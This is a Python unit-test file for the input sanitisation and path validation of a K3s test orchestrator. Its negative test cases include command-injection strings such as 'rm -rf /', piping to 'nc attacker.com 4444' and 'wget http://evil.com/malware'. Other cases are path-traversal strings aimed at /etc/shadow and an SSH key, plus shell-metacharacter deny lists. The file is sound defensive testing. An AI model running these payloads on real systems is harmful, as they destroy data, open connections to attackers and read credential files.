#!/usr/bin/env python3
"""
Tests for Integrated Test Orchestrator Security Features
Copyright (c) 2025 Tyler Zervas
Licensed under the MIT License.

This module tests the security validation functions and command injection
protections in the integrated test orchestrator.
"""

import json
import subprocess
import tempfile
import unittest
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock

from integrated_test_orchestrator import (
    IntegratedTestOrchestrator,
    sanitize_categories,
    validate_path,
    K3sValidationResult,
)


class TestSecurityValidationFunctions(unittest.TestCase):
    """Test security validation functions for command injection protections."""

    def test_sanitize_categories_valid_inputs(self):
        """Test sanitize_categories with valid category inputs."""
        # Test individual valid categories
        valid_categories = ["core", "k3s-specific", "performance", "security", "failure", "production", "all"]
        for category in valid_categories:
            result = sanitize_categories([category])
            self.assertEqual(result, [category])

        # Test multiple valid categories
        result = sanitize_categories(["core", "security", "performance"])
        self.assertEqual(result, ["core", "security", "performance"])

        # Test empty list
        result = sanitize_categories([])
        self.assertEqual(result, [])

        # Test None input
        result = sanitize_categories(None)
        self.assertEqual(result, [])

    def test_sanitize_categories_invalid_inputs(self):
        """Test sanitize_categories with invalid/malicious inputs."""
        # Test command injection attempts
        malicious_inputs = [
            ["core; rm -rf /"],
            ["core && cat /etc/passwd"],
            ["core | nc attacker.com 4444"],
            ["core`whoami`"],
            ["core$(id)"],
            ["../../../etc/passwd"],
            ["core\x00"],
            ["core\n\r"],
        ]

        for malicious_input in malicious_inputs:
            with self.assertRaises(ValueError):
                sanitize_categories(malicious_input)

        # Test invalid category names
        with self.assertRaises(ValueError):
            sanitize_categories(["invalid_category"])

        with self.assertRaises(ValueError):
            sanitize_categories([""])

        # Test non-string inputs
        with self.assertRaises(ValueError):
            sanitize_categories([123])

        with self.assertRaises(ValueError):
            sanitize_categories([None])

    def test_sanitize_categories_edge_cases(self):
        """Test sanitize_categories edge cases."""
        # Test whitespace handling
        result = sanitize_categories(["  core  ", " security "])
        self.assertEqual(result, ["core", "security"])

        # Test case sensitivity (should fail for wrong case)
        with self.assertRaises(ValueError):
            sanitize_categories(["CORE"])

        with self.assertRaises(ValueError):
            sanitize_categories(["Core"])

    def test_validate_path_valid_inputs(self):
        """Test validate_path with valid path inputs."""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            
            # Test absolute path
            result = validate_path(temp_path)
            self.assertEqual(result.resolve(), temp_path.resolve())

            # Test string path
            result = validate_path(str(temp_path))
            self.assertEqual(result.resolve(), temp_path.resolve())

            # Test subdirectory
            subdir = temp_path / "subdir"
            subdir.mkdir()
            result = validate_path(subdir)
            self.assertEqual(result.resolve(), subdir.resolve())

    def test_validate_path_traversal_attacks(self):
        """Test validate_path against path traversal attacks."""
        # Test various path traversal attempts
        traversal_attempts = [
            "../../../etc/passwd",
            "../../root/.ssh/id_rsa",
            "/tmp/../../../etc/shadow",
            "subdir/../../etc/hosts",
            Path("..") / ".." / "etc" / "passwd",
        ]

        for attack_path in traversal_attempts:
            with self.assertRaises(ValueError, msg=f"Path traversal not detected: {attack_path}"):
                validate_path(attack_path)

    def test_validate_path_invalid_inputs(self):
        """Test validate_path with invalid inputs."""
        # Test empty path
        with self.assertRaises(ValueError):
            validate_path("")

        with self.assertRaises(ValueError):
            validate_path(None)

        # Test null byte injection
        with self.assertRaises(ValueError):
            validate_path("/tmp/test\x00file")

        # Test path that doesn't exist but would be dangerous
        with self.assertRaises(ValueError):
            validate_path("/tmp/../../../etc/passwd")


class TestIntegratedTestOrchestratorSecurity(unittest.TestCase):
    """Test security features of IntegratedTestOrchestrator class."""

    def setUp(self):
        """Set up test fixtures."""
        # Create temporary directory for testing
        self.temp_dir = tempfile.TemporaryDirectory()
        self.temp_path = Path(self.temp_dir.name)
        
        # Create mock directory structure
        (self.temp_path / "scripts" / "testing").mkdir(parents=True, exist_ok=True)
        (self.temp_path / "testing" / "k3s-validation").mkdir(parents=True, exist_ok=True)
        
        # Create mock orchestrator script
        orchestrator_script = self.temp_path / "testing" / "k3s-validation" / "orchestrator.sh"
        orchestrator_script.write_text("#!/bin/bash\necho 'mock orchestrator'")
        orchestrator_script.chmod(0o755)

    def tearDown(self):
        """Clean up test fixtures."""
        self.temp_dir.cleanup()

    def test_orchestrator_initialization_path_validation(self):
        """Test that orchestrator validates paths during initialization."""
        # Test valid initialization
        orchestrator = IntegratedTestOrchestrator(base_dir=str(self.temp_path))
        self.assertIsInstance(orchestrator, IntegratedTestOrchestrator)

        # Test invalid base directory
        with self.assertRaises(ValueError):
            IntegratedTestOrchestrator(base_dir="../../../etc")

    @patch('subprocess.run')
    def test_run_k3s_validation_tests_command_injection_protection(self, mock_subprocess):
        """Test that run_k3s_validation_tests prevents command injection."""
        orchestrator = IntegratedTestOrchestrator(base_dir=str(self.temp_path))
        
        # Mock successful subprocess execution
        mock_result = Mock()
        mock_result.returncode = 0
        mock_result.stderr = ""
        mock_subprocess.return_value = mock_result

        # Test malicious category injection attempts
        malicious_categories = [
            ["core; rm -rf /"],
            ["core && wget http://evil.com/malware"],
            ["core | nc attacker.com 4444"],
            ["core`whoami`"],
            ["core$(id)"],
        ]

        for malicious_cats in malicious_categories:
            result = orchestrator.run_k3s_validation_tests(categories=malicious_cats)
            # Should return None due to sanitization failure
            self.assertIsNone(result, f"Command injection not prevented for: {malicious_cats}")

        # Verify subprocess.run was never called with malicious input
        self.assertFalse(mock_subprocess.called)

    @patch('subprocess.run')
    def test_run_k3s_validation_tests_valid_categories(self, mock_subprocess):
        """Test that run_k3s_validation_tests works with valid categories."""
        orchestrator = IntegratedTestOrchestrator(base_dir=str(self.temp_path))
        
        # Mock successful subprocess execution
        mock_result = Mock()
        mock_result.returncode = 0
        mock_result.stderr = ""
        mock_subprocess.return_value = mock_result

        # Test with valid categories
        valid_categories = ["core", "security", "performance"]
        result = orchestrator.run_k3s_validation_tests(categories=valid_categories)

        # Should succeed and return K3sValidationResult
        self.assertIsInstance(result, K3sValidationResult)
        self.assertEqual(result.categories_run, valid_categories)
        
        # Verify subprocess.run was called with safe arguments
        mock_subprocess.assert_called_once()
        call_args = mock_subprocess.call_args[0][0]
        
        # Verify command structure is safe
        self.assertTrue(any("core" in str(arg) for arg in call_args))
        self.assertTrue(any("security" in str(arg) for arg in call_args))
        self.assertTrue(any("performance" in str(arg) for arg in call_args))
        
        # Verify no shell metacharacters in command
        command_str = " ".join(str(arg) for arg in call_args)
        dangerous_chars = [";", "&", "|", "`", "$", "\n", "\r", "\x00"]
        for char in dangerous_chars:
            self.assertNotIn(char, command_str)

    @patch('subprocess.run')
    def test_run_k3s_validation_tests_report_format_validation(self, mock_subprocess):
        """Test that run_k3s_validation_tests validates report format parameter."""
        orchestrator = IntegratedTestOrchestrator(base_dir=str(self.temp_path))
        
        # Mock successful subprocess execution
        mock_result = Mock()
        mock_result.returncode = 0
        mock_result.stderr = ""
        mock_subprocess.return_value = mock_result

        # Test invalid report formats
        invalid_formats = ["xml; rm -rf /", "json && whoami", "html | nc evil.com 4444", "txt"]
        
        for invalid_format in invalid_formats:
            result = orchestrator.run_k3s_validation_tests(
                categories=["core"], 
                report_format=invalid_format
            )
            self.assertIsNone(result, f"Invalid report format not rejected: {invalid_format}")

        # Test valid report formats
        valid_formats = ["json", "xml", "html"]
        for valid_format in valid_formats:
            result = orchestrator.run_k3s_validation_tests(
                categories=["core"], 
                report_format=valid_format
            )
            self.assertIsInstance(result, K3sValidationResult)

    @patch('subprocess.run')
    def test_run_k3s_validation_tests_timeout_protection(self, mock_subprocess):
        """Test that run_k3s_validation_tests has timeout protection."""
        orchestrator = IntegratedTestOrchestrator(base_dir=str(self.temp_path))
        
        # Mock subprocess timeout
        mock_subprocess.side_effect = subprocess.TimeoutExpired("cmd", 1800)

        result = orchestrator.run_k3s_validation_tests(categories=["core"])
        
        # Should return None on timeout
        self.assertIsNone(result)
        
        # Verify timeout was set
        mock_subprocess.assert_called_once()
        call_kwargs = mock_subprocess.call_args[1]
        self.assertEqual(call_kwargs['timeout'], 1800)

    def test_run_k3s_validation_tests_working_directory_validation(self):
        """Test that working directory is validated before execution."""
        # Create orchestrator with invalid k3s validation directory
        bad_temp_dir = tempfile.TemporaryDirectory()
        bad_temp_path = Path(bad_temp_dir.name)
        (bad_temp_path / "scripts" / "testing").mkdir(parents=True, exist_ok=True)
        # Don't create k3s-validation directory
        
        orchestrator = IntegratedTestOrchestrator(base_dir=str(bad_temp_path))
        
        result = orchestrator.run_k3s_validation_tests(categories=["core"])
        
        # Should return None due to missing orchestrator script
        self.assertIsNone(result)
        
        bad_temp_dir.cleanup()

    @patch('builtins.open', create=True)
    @patch('json.load')
    @patch('subprocess.run')
    def test_run_k3s_validation_tests_report_parsing_security(self, mock_subprocess, mock_json_load, mock_open):
        """Test that report parsing is secure against malicious JSON."""
        orchestrator = IntegratedTestOrchestrator(base_dir=str(self.temp_path))
        
        # Create mock reports directory
        reports_dir = self.temp_path / "testing" / "k3s-validation" / "reports"
        reports_dir.mkdir(exist_ok=True)
        
        # Create mock report file
        report_file = reports_dir / "test-report.json"
        report_file.touch()
        
        # Mock successful subprocess execution
        mock_result = Mock()
        mock_result.returncode = 0
        mock_result.stderr = ""
        mock_subprocess.return_value = mock_result

        # Test with malicious JSON data
        malicious_data = {
            "summary": {"__proto__": {"polluted": "value"}},
            "cluster_info": ["not", "a", "dict"],
            "test_suite": "A" * 1000,  # Very long string
            "namespace": "test\x00namespace",  # Null byte
        }
        mock_json_load.return_value = malicious_data

        result = orchestrator.run_k3s_validation_tests(categories=["core"])
        
        # Should handle malicious data safely
        self.assertIsInstance(result, K3sValidationResult)
        
        # Verify data sanitization
        self.assertIsInstance(result.summary, dict)
        self.assertIsInstance(result.cluster_info, dict)
        self.assertEqual(len(result.test_suite), 100)  # Should be truncated
        self.assertEqual(len(result.namespace), 50)    # Should be truncated

    def test_validate_framework_availability(self):
        """Test framework availability checking."""
        orchestrator = IntegratedTestOrchestrator(base_dir=str(self.temp_path))
        
        availability = orchestrator._validate_framework_availability()
        
        # Should detect our mock structure
        self.assertTrue(availability["python_framework"])
        self.assertTrue(availability["k3s_validation"])
        self.assertTrue(availability["orchestrator_script"])


class TestSecurityIntegration(unittest.TestCase):
    """Integration tests for security features."""

    def setUp(self):
        """Set up integration test fixtures."""
        self.temp_dir = tempfile.TemporaryDirectory()
        self.temp_path = Path(self.temp_dir.name)
        
        # Create comprehensive mock directory structure
        (self.temp_path / "scripts" / "testing").mkdir(parents=True, exist_ok=True)
        (self.temp_path / "testing" / "k3s-validation").mkdir(parents=True, exist_ok=True)
        (self.temp_path / "testing" / "k3s-validation" / "reports").mkdir(parents=True, exist_ok=True)
        
        # Create mock orchestrator script
        orchestrator_script = self.temp_path / "testing" / "k3s-validation" / "orchestrator.sh"
        orchestrator_script.write_text("#!/bin/bash\necho 'mock orchestrator'\nexit 0")
        orchestrator_script.chmod(0o755)

    def tearDown(self):
        """Clean up integration test fixtures."""
        self.temp_dir.cleanup()

    @patch('scripts.testing.integrated_test_orchestrator.HomelabTestReporter')
    @patch('subprocess.run')
    def test_end_to_end_security_validation(self, mock_subprocess, mock_reporter_class):
        """Test end-to-end security validation in integrated test suite."""
        # Mock Python framework reporter
        mock_reporter = Mock()
        mock_reporter.run_comprehensive_test_suite.return_value = Mock(
            overall_status="pass",
            summary={"tests_passed": 5, "tests_failed": 0},
            recommendations=[]
        )
        mock_reporter_class.return_value = mock_reporter
        
        # Mock K3s subprocess execution
        mock_result = Mock()
        mock_result.returncode = 0
        mock_result.stderr = ""
        mock_subprocess.return_value = mock_result

        orchestrator = IntegratedTestOrchestrator(base_dir=str(self.temp_path))
        
        # Test with potentially malicious inputs that should be sanitized
        results = orchestrator.run_integrated_test_suite(
            python_config_paths=["config1.yaml", "config2.yaml"],
            k3s_categories=["core", "security"],
            parallel_k3s=False
        )
        
        # Should complete successfully with sanitized inputs
        self.assertEqual(results.overall_status, "pass")
        self.assertIsNotNone(results.python_framework_results)
        self.assertIsNotNone(results.k3s_validation_results)
        
        # Verify safe command execution
        mock_subprocess.assert_called_once()
        call_args = mock_subprocess.call_args[0][0]
        command_str = " ".join(str(arg) for arg in call_args)
        
        # Should not contain shell metacharacters
        dangerous_chars = [";", "&", "|", "`", "$"]
        for char in dangerous_chars:
            self.assertNotIn(char, command_str)

    def test_security_recommendations_generation(self):
        """Test that security-specific recommendations are generated."""
        orchestrator = IntegratedTestOrchestrator(base_dir=str(self.temp_path))
        
        # Create mock results with security issues
        python_results = Mock()
        python_results.overall_status = "pass"
        python_results.recommendations = ["Update security configurations"]
        
        k3s_results = Mock()
        k3s_results.exit_code = 1
        k3s_results.summary = {"failed": 2, "warnings": 1}
        
        recommendations = orchestrator.generate_integration_recommendations(
            python_results, k3s_results
        )
        
        # Should include security-related recommendations
        self.assertIn("Update security configurations", recommendations)
        self.assertIn("Address 2 failed K3s validation tests", recommendations)
        self.assertIn("Review 1 K3s validation warnings", recommendations)


if __name__ == "__main__":
    unittest.main()